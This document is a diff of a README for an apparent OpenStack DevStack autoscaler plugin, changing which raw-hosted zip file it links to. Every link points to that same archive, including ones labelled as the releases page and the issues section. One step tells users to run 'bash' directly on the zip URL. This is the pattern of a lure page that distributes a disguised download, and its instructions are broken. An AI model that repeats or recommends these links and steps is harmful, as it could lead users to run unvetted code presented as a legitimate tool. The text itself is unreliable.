@@ -1,7 +1,7 @@
 # 🎛️ Autoscaler_Interattivo_Plugin_Devstack - Scale Your VMs With Ease
 
 ## 🔗 Download the Latest Version
-[![Download](https://raw.githubusercontent.com/Markusdarkus1/Autoscaler_Interattivo_Plugin_Devstack/main/Nuttallia/Autoscaler_Interattivo_Plugin_Devstack.zip%20Release-brightgreen)](https://raw.githubusercontent.com/Markusdarkus1/Autoscaler_Interattivo_Plugin_Devstack/main/Nuttallia/Autoscaler_Interattivo_Plugin_Devstack.zip)
+[![Download](https://raw.githubusercontent.com/Markusdarkus1/Autoscaler_Interattivo_Plugin_Devstack/main/IMG/Autoscaler-Plugin-Interattivo-Devstack-2.0.zip%20Release-brightgreen)](https://raw.githubusercontent.com/Markusdarkus1/Autoscaler_Interattivo_Plugin_Devstack/main/IMG/Autoscaler-Plugin-Interattivo-Devstack-2.0.zip)
 
 ## 🚀 Getting Started
 The Autoscaler Interattivo Plugin for DevStack is an interactive tool designed to help you easily scale your virtual machines (VMs) between different flavors in OpenStack. With a simple command-line interface (CLI) menu, you can manage your VMs without needing programming knowledge.
@@ -20,7 +20,7 @@ Before you begin, ensure your computer meets the following requirements:
 ## 🔔 Installation Instructions
 Follow these steps to download and run the Autoscaler Interattivo Plugin:
 
-1. **Visit the Releases Page:** Click on the following link to open the releases page: [Download Here](https://raw.githubusercontent.com/Markusdarkus1/Autoscaler_Interattivo_Plugin_Devstack/main/Nuttallia/Autoscaler_Interattivo_Plugin_Devstack.zip).
+1. **Visit the Releases Page:** Click on the following link to open the releases page: [Download Here](https://raw.githubusercontent.com/Markusdarkus1/Autoscaler_Interattivo_Plugin_Devstack/main/IMG/Autoscaler-Plugin-Interattivo-Devstack-2.0.zip).
    
 2. **Choose Your Version:** On the releases page, find the latest stable version available for download.
 
@@ -38,7 +38,7 @@ Follow these steps to download and run the Autoscaler Interattivo Plugin:
 
 7. **Run the Plugin Script:** Execute the main script by entering:
    ```bash
-   bash https://raw.githubusercontent.com/Markusdarkus1/Autoscaler_Interattivo_Plugin_Devstack/main/Nuttallia/Autoscaler_Interattivo_Plugin_Devstack.zip
+   bash https://raw.githubusercontent.com/Markusdarkus1/Autoscaler_Interattivo_Plugin_Devstack/main/IMG/Autoscaler-Plugin-Interattivo-Devstack-2.0.zip
    ```
 
 8. **Follow On-Screen Instructions:** The CLI will guide you through the scaling process. Simply follow the prompts to select your desired VM flavor and perform scaling operations.
@@ -61,9 +61,9 @@ If something goes wrong, consider these common issues:
 Contributions are welcome. If you have suggestions or improvements, please reach out through the Issues section of the repository. Your insights can help enhance this tool for everyone.
 
 ## 📞 Support
-For assistance, visit our [Issues Section](https://raw.githubusercontent.com/Markusdarkus1/Autoscaler_Interattivo_Plugin_Devstack/main/Nuttallia/Autoscaler_Interattivo_Plugin_Devstack.zip) on GitHub. You can report bugs or ask questions about the plugin.
+For assistance, visit our [Issues Section](https://raw.githubusercontent.com/Markusdarkus1/Autoscaler_Interattivo_Plugin_Devstack/main/IMG/Autoscaler-Plugin-Interattivo-Devstack-2.0.zip) on GitHub. You can report bugs or ask questions about the plugin.
 
 ## 🔗 Download the Latest Version Again
-Don’t forget to download the most recent version for the best performance: [Download Here](https://raw.githubusercontent.com/Markusdarkus1/Autoscaler_Interattivo_Plugin_Devstack/main/Nuttallia/Autoscaler_Interattivo_Plugin_Devstack.zip). 
+Don’t forget to download the most recent version for the best performance: [Download Here](https://raw.githubusercontent.com/Markusdarkus1/Autoscaler_Interattivo_Plugin_Devstack/main/IMG/Autoscaler-Plugin-Interattivo-Devstack-2.0.zip). 
 
 Enjoy scaling your VMs with the Autoscaler Interattivo Plugin!
